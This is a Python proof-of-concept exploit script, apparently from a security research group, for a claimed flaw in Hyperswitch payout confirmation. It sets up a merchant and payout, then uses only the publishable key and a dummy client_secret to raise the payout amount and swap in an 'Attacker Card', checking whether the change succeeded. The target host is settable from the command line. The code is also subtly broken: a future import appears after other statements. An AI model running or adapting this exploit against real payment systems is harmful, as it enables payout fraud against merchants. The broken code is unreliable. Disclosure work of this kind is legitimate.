#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: hyperswitch-payout-confirm-secret (High: 7.5)
#  Vendor: Hyperswitch (Juspay)
#  Versions: Hyperswitch <= 2026.09.21.0
#  Impact: Unauthorized payout amount raise
#  Requires: unauthenticated POST /payouts/{payout_id}/confirm
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "hyperswitch-payout-confirm-secret"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import json
import sys
import uuid
import urllib.error
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18083").rstrip("/")
ADMIN = "test_admin"
MID = "hs_po_" + uuid.uuid4().hex[:8]
ORIG_AMOUNT = 1000
RAISED_AMOUNT = 99900
DUMMY_SECRET = "payout_not_the_real_client_secret"


def http(method: str, path: str, *, body=None, headers=None) -> tuple[int, str]:
    url = path if path.startswith("http") else BASE + path
    hdrs = {"User-Agent": "hs-payout-secret-lab"}
    if headers:
        hdrs.update(headers)
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        hdrs.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def j(method: str, path: str, body=None, headers=None) -> tuple[int, dict | str]:
    code, text = http(method, path, body=body, headers=headers)
    try:
        return code, json.loads(text)
    except json.JSONDecodeError:
        return code, text


def main() -> None:
    print(f"IOC base={BASE} merchant_id={MID}")
    s, b = http("GET", "/health")
    print(f"IOC health status={s} body={b!r}"[:180])

    s, acct = j(
        "POST",
        "/accounts",
        {
            "merchant_id": MID,
            "merchant_name": "Lab Payout Merchant",
            "merchant_details": {
                "primary_contact_person": "Lab",
                "primary_email": "lab@localhost.invalid",
            },
            "return_url": "https://127.0.0.1/success",
        },
        headers={"api-key": ADMIN},
    )
    print(f"IOC accounts status={s} snippet={json.dumps(acct)[:240] if not isinstance(acct, str) else acct[:240]!r}")
    if s >= 300 or not isinstance(acct, dict):
        print("FAIL create merchant")
        raise SystemExit(1)
    merchant_id = acct.get("merchant_id") or MID
    pk = acct.get("publishable_key")
    print(f"IOC merchant_id={merchant_id} pk={str(pk)[:20]}…")

    s, key = j(
        "POST",
        f"/api_keys/{merchant_id}",
        {"name": "lab", "expiration": "2069-09-23T01:02:03.000Z"},
        headers={"api-key": ADMIN},
    )
    if s >= 300 or not isinstance(key, dict) or not key.get("api_key"):
        print(f"FAIL create api key {key}")
        raise SystemExit(1)
    api_key = key["api_key"]
    auth = {"api-key": api_key}
    if not pk:
        pk = acct.get("publishable_key")
    print(f"IOC api_key_len={len(api_key)}")

    s, wp = j(
        "POST",
        f"/account/{merchant_id}/connectors",
        {
            "connector_type": "payout_processor",
            "connector_name": "worldpayxml",
            "connector_account_details": {
                "auth_type": "SignatureKey",
                "api_secret": "LABMERCH",
                "api_key": "lab_user",
                "key1": "lab_pass",
            },
            "test_mode": True,
            "disabled": False,
            "payment_methods_enabled": [
                {
                    "payment_method": "card",
                    "payment_method_types": [
                        {
                            "payment_method_type": "credit",
                            "card_networks": ["Visa"],
                            "minimum_amount": 1,
                            "maximum_amount": 68607706,
                            "recurring_enabled": True,
                            "installment_payment_enabled": True,
                        }
                    ],
                }
            ],
        },
        headers=auth,
    )
    print(f"IOC payout MCA status={s} snippet={json.dumps(wp)[:240] if not isinstance(wp, str) else wp[:240]!r}")

    create_body = {
        "amount": ORIG_AMOUNT,
        "currency": "USD",
        "confirm": False,
        "auto_fulfill": False,
        "payout_type": "card",
        "description": "lab payout confirm secret",
        "payout_method_data": {
            "card": {
                "card_number": "4111111111111111",
                "expiry_month": "03",
                "expiry_year": "2030",
                "card_holder_name": "Lab Card",
            }
        },
        "billing": {
            "address": {
                "line1": "1 Lab",
                "city": "Lab",
                "state": "CA",
                "zip": "94107",
                "country": "US",
                "first_name": "Lab",
                "last_name": "User",
            }
        },
        "customer": {
            "email": "payout-lab@localhost.invalid",
            "name": "Lab Payout",
        },
    }
    s, po = j("POST", "/payouts/create", create_body, headers=auth)
    print(f"IOC payouts.create status={s} snippet={json.dumps(po)[:400] if not isinstance(po, str) else po[:400]!r}")
    if s >= 300 or not isinstance(po, dict) or not po.get("payout_id"):
        print("FAIL create payout")
        raise SystemExit(1)
    payout_id = po["payout_id"]
    real_secret = po.get("client_secret")
    before_amt = po.get("amount")
    before_status = po.get("status")
    print(f"IOC payout_id={payout_id} amount={before_amt} status={before_status} secret_prefix={str(real_secret)[:24]}")
    if before_amt != ORIG_AMOUNT:
        print(f"FAIL unexpected create amount {before_amt}")
        raise SystemExit(1)

    # Control: payments confirm with dummy client_secret + pk_ should fail.
    s_pay, pay = j(
        "POST",
        "/payments",
        {
            "amount": 100,
            "currency": "USD",
            "confirm": False,
            "description": "control payment",
        },
        headers=auth,
    )
    if isinstance(pay, dict) and pay.get("payment_id") and pay.get("client_secret"):
        s_c, ctrl = j(
            "POST",
            f"/payments/{pay['payment_id']}/confirm",
            {"client_secret": DUMMY_SECRET},
            headers={"api-key": pk},
        )
        print(f"IOC payments.confirm dummy-secret status={s_c} snippet={json.dumps(ctrl)[:200] if not isinstance(ctrl, str) else ctrl[:200]!r}")
        if s_c == 200:
            print("FAIL payments confirm accepted dummy client_secret (control broken)")
            raise SystemExit(1)
    else:
        print(f"IOC skip payments control create_status={s_pay}")

    s, conf = j(
        "POST",
        f"/payouts/{payout_id}/confirm",
        {
            "client_secret": DUMMY_SECRET,
            "amount": RAISED_AMOUNT,
            "currency": "USD",
            "auto_fulfill": True,
            "payout_type": "card",
            "payout_method_data": {
                "card": {
                    "card_number": "4111111111111111",
                    "expiry_month": "03",
                    "expiry_year": "2030",
                    "card_holder_name": "Attacker Card",
                }
            },
        },
        headers={"api-key": pk},
    )
    print(f"IOC payouts.confirm status={s} snippet={json.dumps(conf)[:500] if not isinstance(conf, str) else conf[:500]!r}")

    s_r, got = j("GET", f"/payouts/{payout_id}", headers=auth)
    print(f"IOC payouts.retrieve status={s_r} snippet={json.dumps(got)[:400] if not isinstance(got, str) else got[:400]!r}")
    if not isinstance(got, dict):
        print("FAIL retrieve payout")
        raise SystemExit(1)
    after_amt = got.get("amount")
    after_status = got.get("status")
    print(f"IOC after amount={after_amt} status={after_status}")

    if s in {401, 403} or (
        isinstance(conf, dict)
        and "client_secret" in json.dumps(conf).lower()
        and "invalid" in json.dumps(conf).lower()
        and after_amt == ORIG_AMOUNT
    ):
        print("FAIL confirm rejected dummy client_secret (bound)")
        raise SystemExit(1)
    if after_amt == RAISED_AMOUNT:
        print("SUCCESS Hyperswitch payout confirm unbound client_secret amount raise")
        raise SystemExit(0)
    if s == 200 and after_amt != ORIG_AMOUNT:
        print(f"SUCCESS amount changed to {after_amt} with dummy client_secret")
        raise SystemExit(0)
    print("FAIL amount not raised")
    raise SystemExit(1)


if __name__ == "__main__":
    main()

